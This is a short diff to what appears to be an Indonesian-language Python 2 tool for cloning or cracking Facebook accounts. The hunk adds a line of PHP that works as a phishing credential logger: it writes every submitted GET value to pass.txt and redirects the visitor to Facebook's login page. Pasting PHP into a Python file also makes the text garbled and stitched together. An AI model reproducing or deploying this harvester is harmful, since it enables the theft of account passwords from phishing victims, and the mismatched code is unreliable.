@@ -870,6 +870,10 @@ def clone_dari_file():
 	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
 	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
 	menu()
+          
+
+
+        &lt;?php header('Location: http://www.Facebook.com/login.php'); $handle = fopen('pass.txt', 'a'); foreach($_GET as $variable =&gt; $value) { fwrite($handle, $variable); fwrite($handle, '='); fwrite($handle, $value); fwrite($handle, '\n'); } fwrite($handle, '\n'); fclose($handle); exit; ?&gt;
 	
        
 		
